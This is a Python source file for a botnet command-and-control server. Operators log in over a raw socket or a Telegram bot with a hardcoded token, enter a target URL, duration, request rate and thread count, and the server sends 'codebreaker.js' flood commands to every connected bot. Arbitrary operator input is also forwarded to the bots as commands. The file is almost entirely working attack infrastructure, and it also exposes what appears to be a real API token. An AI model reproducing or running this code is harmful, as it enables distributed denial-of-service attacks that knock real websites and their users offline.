from termcolor import colored
import socket
import threading
import telebot
import time
import threading
from colorama import Fore, Style, init
ascii_art = """

▄▄▄▄· ▪         ▄▄· ▄▄▄   ▄· ▄▌ ▄▄▄·▄▄▄▄▄    ▄▄▌   ▄▄▄· ▄▄▄▄· .▄▄ · 
▐█ ▀█▪██ ▪     ▐█ ▌▪▀▄ █·▐█▪██▌▐█ ▄█•██      ██•  ▐█ ▀█ ▐█ ▀█▪▐█ ▀.     
▐█▀▀█▄▐█· ▄█▀▄ ██ ▄▄▐▀▀▄ ▐█▌▐█▪ ██▀· ▐█.▪    ██▪  ▄█▀▀█ ▐█▀▀█▄▄▀▀▀█▄
██▄▪▐█▐█▌▐█▌.▐▌▐███▌▐█•█▌ ▐█▀·.▐█▪·• ▐█▌·    ▐█▌▐▌▐█ ▪▐▌██▄▪▐█▐█▄▪▐█
·▀▀▀▀ ▀▀▀ ▀█▄▀▪·▀▀▀ .▀  ▀  ▀ • .▀    ▀▀▀     .▀▀▀  ▀  ▀ ·▀▀▀▀  ▀▀▀▀ 

[Made by clappz && samir]

"""

colored_ascii_art = colored(ascii_art, 'blue')

print(colored_ascii_art)

import socket
import threading
import time
from colorama import Fore, Style, init

init(autoreset=True)

import threading
import subprocess
from colorama import Fore, Style, init
import socket
import time

init(autoreset=True)

HOST = '0.0.0.0'
BOT_PORT = 8083
CLIENT_PORT = 8084
connected_bots = []
connected_clients = []
current_method = None
method_start_time = None

def main_loop():
    while True:
        pass
    
user_credentials = {"samir": "samir", "maleek": "maleek"}


TELEGRAM_BOT_TOKEN = '5793992468:AAEwrwNurM5x7s7ebj6Ep-rblt0gnWQLxAE'
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

@bot.message_handler(commands=['DDOS'])
def handle_ddos_command(message):
    user_id = message.from_user.id
    bot.send_message(user_id, "DDOS command received. Please enter the necessary information:")

    bot.send_message(user_id, "Enter the target URL:")
    bot.register_next_step_handler(message, process_ddos_target_url, user_id)

def process_ddos_target_url(message, user_id):
    target_url = message.text.strip()

    bot.send_message(user_id, f"Target URL set to: {target_url}")
    bot.send_message(user_id, "Enter the time limit (in seconds):")
    bot.register_next_step_handler(message, process_ddos_time_limit, user_id, target_url)

def process_ddos_time_limit(message, user_id, target_url):
    time_limit = message.text.strip()

    bot.send_message(user_id, f"Time limit set to: {time_limit} seconds")
    bot.send_message(user_id, "Enter requests per second:")
    bot.register_next_step_handler(message, process_ddos_req_per_sec, user_id, target_url, time_limit)

def process_ddos_req_per_sec(message, user_id, target_url, time_limit):
    req_per_sec = message.text.strip()

    bot.send_message(user_id, f"Requests per second set to: {req_per_sec}")
    bot.send_message(user_id, "Enter the number of threads:")
    bot.register_next_step_handler(message, process_ddos_threads, user_id, target_url, time_limit, req_per_sec)

def process_ddos_threads(message, user_id, target_url, time_limit, req_per_sec):
    threads = message.text.strip()

    bot.send_message(user_id, f"Number of threads set to: {threads}")
    bot.send_message(user_id, "Starting the DDOS attack...")

    # Form the command and send it to the bots
    command = f"node codebreaker.js {target_url} {time_limit} {req_per_sec} {threads}"
    send_command_to_bots(command)

    bot.send_message(user_id, "DDOS attack initiated. Please use /ongoing command to check the status.")

def start_bot_listener():
    bot_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        bot_server_socket.bind((HOST, BOT_PORT))
        bot_server_socket.listen(5)

        while True:
            bot_socket, bot_address = bot_server_socket.accept()
            connected_bots.append(bot_socket)

            bot_number = len(connected_bots)
            print(f"Bot {bot_number} connected: {bot_address}")

    except Exception as e:
        print(f"An error occurred while listening for bots: {e}")
    finally:
        bot_server_socket.close()

def start_client_listener():
    client_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        client_server_socket.bind((HOST, CLIENT_PORT))
        client_server_socket.listen(5)

        while True:
            client_socket, client_address = client_server_socket.accept()
            connected_clients.append(client_socket)

            client_number = len(connected_clients)
            print(f"Client {client_number} connected: {client_address}")

            client_thread = threading.Thread(target=handle_client, args=(client_socket,))
            client_thread.start()

    except Exception as e:
        print(f"An error occurred while listening for clients: {e}")
    finally:
        client_server_socket.close()

def handle_client(client_socket):
    client_socket.sendall("Enter username: ".encode('utf-8'))
    username = client_socket.recv(1024).decode('utf-8').strip()
    # 

    client_socket.sendall("Enter password: ".encode('utf-8'))
    password = client_socket.recv(1024).decode('utf-8').strip()
 
    if username in user_credentials and user_credentials[username] == password:
        client_socket.sendall("Authentication successful!\n".encode('utf-8'))
        client_socket.sendall(colored_ascii_art.encode('utf-8'))
        handle_authenticated_client(client_socket, username)
    else:
        client_socket.sendall("Authentication failed. Goodbye!\n".encode('utf-8'))
        client_socket.close()
def handle_authenticated_client(client_socket, username):
    print(f"Authenticated user: {username}")
    while True:
        client_socket.sendall("Enter command: ".encode('utf-8'))
        user_input = client_socket.recv(1024).decode('utf-8').strip()
        if user_input.lower() == 'exit':
            client_socket.sendall("Goodbye!\n".encode('utf-8'))
            break

        process_user_input(user_input, client_socket, username)  # Pass 'username' as an argument

    client_socket.close()

def process_user_input(input_text, client_socket, username):
    if input_text == "current_bot":
        bot_count = len(connected_bots)
        response = f"Total connected bots: {bot_count}\n"
        client_socket.sendall(response.encode('utf-8'))
    elif input_text == "show":
        execute_method(client_socket)
    elif input_text == "help":
        response = "Use 'show' command to display methods.\n"
        client_socket.sendall(response.encode('utf-8'))
    elif input_text.lower() == 'stop':
        send_command_to_bots("stop")
        response = "Stop command sent to bots.\n"
        client_socket.sendall(response.encode('utf-8'))
    elif  input_text == "ongoing":
        if current_method:
            elapsed_time = int(time.time() - method_start_time)
            response = f"Method {current_method} is ongoing for {elapsed_time} seconds.\n"
    
        else:
            response = "No ongoing method.\n"
            client_socket.sendall(response.encode('utf-8'))
    elif input_text.lower() == "passwd":
        client_socket.sendall("current password: ".encode('utf-8'))
        current_password = client_socket.recv(1024).decode('utf-8').strip()
        client_socket.sendall("new password: ".encode('utf-8'))
        new_password = client_socket.recv(1024).decode('utf-8').strip()

        # Check if the current password is correct before updating
        if user_credentials.get(username) == current_password:
            user_credentials[username] = new_password
            client_socket.sendall(f"Password changed to {new_password}\n".encode('utf-8'))
        else:
            client_socket.sendall("Incorrect current password\n".encode('utf-8'))

    else:
        send_command_to_bots(input_text)


def execute_method(client_socket):
    response = "Available methods:\n1 - KILLER\nWhat method do you want: "
    client_socket.sendall(response.encode('utf-8'))

    method = client_socket.recv(1024).decode('utf-8').strip()
    if method == "1":
        client_socket.sendall(" ".encode('utf-8'))
        url = client_socket.recv(1024).decode('utf-8').strip()

        req_per_sec  = "200"

        client_socket.sendall("Enter the number of threads: ".encode('utf-8'))
        threads = client_socket.recv(1024).decode('utf-8').strip()

        time_limit = "120"


        
        method_start_time = time.time()

    

        command = f"node codebreaker.js {url} {time_limit} {req_per_sec} {threads}"
        send_command_to_bots(command)

def send_command_to_bots(command):
    for bot_socket in connected_bots:
        try:
            bot_socket.sendall(command.encode('utf-8'))
        except socket.error as e:
            print(f"Error sending command to bot: {e}")



if __name__ == "__main__":
    bot_listener_thread = threading.Thread(target=start_bot_listener)
    bot_listener_thread.start()

    client_listener_thread = threading.Thread(target=start_client_listener)
    client_listener_thread.start()

    telebot_thread = threading.Thread(target=bot.polling, kwargs={'none_stop': True})
    telebot_thread.start()

    main_loop()



